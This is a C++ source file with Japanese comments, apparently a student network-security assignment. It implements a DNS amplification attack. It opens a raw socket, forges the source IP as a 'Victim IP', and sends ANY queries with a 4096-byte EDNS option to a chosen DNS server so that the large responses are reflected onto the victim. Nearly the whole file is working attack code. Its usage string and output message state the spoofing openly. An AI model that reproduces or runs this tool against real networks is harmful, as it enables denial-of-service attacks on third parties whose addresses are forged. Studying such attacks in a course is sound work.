#include <iostream>
#include <cstdio>
#include <cstdlib>
#include <cstring> // bzero
#include <sys/socket.h> // socket
#include <netinet/ip.h> // ip header
#include <netinet/udp.h> // udp header
#include <arpa/inet.h> // inet_addr, htons

#include <chrono>
#include <thread>

#define MAX_BUFF 65535 // ipv4パケット最大長
#define DNS_PORT 53 // dns port
#define DNS_REPEAT 3 // DNSクエリのリピート時間
#define DOMAIN_NAME "4ieee3org" // DNS特殊形式

struct dnshdr {
    uint16_t queryid;
    uint16_t flags; // 要求/応答を示すビットマスク
    uint16_t qu_count; // 問題数
    uint16_t an_count; // 回答数
    uint16_t au_count; // 権限数
    uint16_t ad_count; // 追加レコード数
} __attribute__((packed));

struct dnsdata {
    unsigned char dname[10]; // 特殊系ドメイン名
    uint16_t dnstype;
    uint16_t dnsclass;
} __attribute__((packed));

struct dnsopt{
    unsigned char name;
    unsigned short type;
    unsigned short udplength;
    unsigned char rcode;
    unsigned char ednsversion;
    unsigned short Z;
    unsigned short datalength;
} __attribute__((packed));

/*
struct dnsflag {
    qr[1] = 0;
    opcode[4] = 0000;
    aa[1] = 0;
    tc[1] = 0;
    rd[1] = 1;
    ra[1] = 1;
    z[3] = 000;
    rcode[4] = 0000;
};
*/

void err_exit(const char *x) {
    perror(x);
    exit(1);
}

unsigned short checksum(void *in, int size){
    long sum = 0;
    unsigned short *ptr = (unsigned short *)in;

    // sum up
    for (; size > 1; size -= 2) {
        sum += *ptr++;
    }

    // 奇数の場合はゼロパディング
    if (size > 0) {
        sum += *((unsigned char *) ptr);
    }

    // overflow
    while (sum >> 16) {
        sum = (sum & 0xffff) + (sum >> 16);
    }

    // 1の補数を返す
    return ~sum;
}

void set_dns(unsigned char *packet, size_t &packetlen) {
    // DNSヘッダの開始位置へのポインタ
    struct dnshdr *dnsh = (struct dnshdr *) (packet + sizeof(struct iphdr) + sizeof(struct udphdr));
    // DNSヘッダを埋める
    dnsh -> queryid = htons(0x73B6); // 学生IDの最後の16ビット（2バイト） 0816054
    dnsh -> flags = htons(0x0100); // dns フラグ構造体の上部に表示される
    dnsh -> qu_count = htons(1); // one question ANY
    dnsh -> ad_count = htons(1); // one OPT for EDNS
    packetlen += sizeof(struct dnshdr);
    // DNSデータの先頭を指すポインタ
    struct dnsdata *dnsd = (struct dnsdata *) (packet + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr));
    // DNSデータを埋める
    dnsd -> dnstype = htons(255); // 任意の(*)で255
    dnsd -> dnsclass = htons(1); // インターネット用1
    // ドメイン名を特殊な形式、つまり数字から16進数に変換する
    unsigned char transformed[] = DOMAIN_NAME;
    for (int i = 0; i < strlen(DOMAIN_NAME); i++) {
        if (isdigit(transformed[i])) {
            transformed[i] = transformed[i] - 48;
        }
    }
    memcpy(dnsd -> dname, transformed, strlen(DOMAIN_NAME));
    packetlen += sizeof(struct dnsdata);
    // fill in EDNS opt
    struct dnsopt *dnso = (struct dnsopt *) (packet + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr) + sizeof(struct dnsdata));
    dnso -> name = 0;
    dnso -> type = htons(41);
    dnso -> udplength = htons(4096); // 4096バイトに増加
    dnso -> rcode = 0;
    dnso -> ednsversion = 0;
    dnso -> Z = htons(0x8000);
    dnso -> datalength = 0;
    packetlen += sizeof(struct dnsopt);
}

void set_udphdr(unsigned char *packet, size_t &packetlen, int srcport) {
    // udpヘッダの開始位置へのポインタ
    struct udphdr *udp = (struct udphdr *) (packet + sizeof(struct iphdr));
    // 更新パケット長
    packetlen += sizeof(struct udphdr);
    // udpヘッダを埋める
    udp -> source = htons(srcport);
    udp -> dest = htons(DNS_PORT);
    udp -> len = htons(packetlen); // udpパケット全長（ヘッダを含む）
    udp -> check = checksum(packet, packetlen);
}

void set_iphdr(unsigned char *packet, size_t &packetlen, char *saddr, char *daddr) {
    // ipヘッダの開始位置へのポインタ
    struct iphdr *ip = (struct iphdr *) packet;
    // 更新パケット長
    packetlen += sizeof(struct iphdr);
    // ipヘッダを埋める
    ip -> ihl = 5; // ヘッダ長（32ビット単位）
    ip -> version = 4; // ipv4
    ip -> tos = 0; // normal (type of service)
    ip -> tot_len = htons(packetlen); // ipパケット全長（ヘッダーを含む）
    ip -> ttl = 64; // time to live
    ip -> protocol = IPPROTO_UDP; // udp
    ip -> check = checksum(packet, packetlen);
    ip -> saddr = inet_addr(saddr); // ipを偽装
    ip -> daddr = inet_addr(daddr);
}

int main(int argc, char *argv[]) {
    // 宣言
    int srcport;
    int sockfd; // ソケットファイル記述子
    int on; // ソケットオプション
    struct sockaddr_in dstaddr; // ソケット宛先アドレス
    socklen_t dstlen;
    unsigned char packet[MAX_BUFF]; // パケットバッファ
    size_t packetlen;

    // 使い方
    if (argc != 4) {
        printf("How to use: %s <Victim IP> <UDP Source Port> <DNS Server IP>", argv[0]);
        exit(1);
    }

    // 範囲内のポート番号か調べる
    srcport = atoi(argv[2]);
    if (srcport < 0 || srcport > 65535) {
        err_exit("main: wrong port value");
    }

    // 生ソケットを作成する
    if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) < 0) {
        err_exit("main: socket");
    }

    // ipヘッダを自己生成するソケットオプションを設定する。
    on = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(int)) < 0) {
        err_exit("main: setsockopt");
    }

    // 宛先アドレスの記入
    bzero(&dstaddr, sizeof(dstaddr));
    dstaddr.sin_family = AF_INET;
    dstaddr.sin_addr.s_addr = inet_addr(argv[3]); // dnsサーバ
    dstaddr.sin_port = htons(DNS_PORT); //dnsポート番号
    dstlen = sizeof(dstaddr);

    // パケットを(内部から)カプセル化する
    packetlen = 0;
    memset(packet, 0, MAX_BUFF);
    set_dns(packet, packetlen);
    set_udphdr(packet, packetlen, srcport);
    set_iphdr(packet, packetlen, argv[1], argv[3]);

    // 送りつける
    for (int i = 0; i < DNS_REPEAT; i++) {
        if (sendto(sockfd, packet, packetlen, 0, (struct sockaddr *) &dstaddr, dstlen) < 0) {
			err_exit("main: sendto");
        }
        printf("Sending DNS packet to DNS server %s with spoofed source %s:%d\n", argv[3], argv[1], srcport);
        std::this_thread::sleep_for(std::chrono::milliseconds(1000));//sleep(1);
    }

    return 0;
}
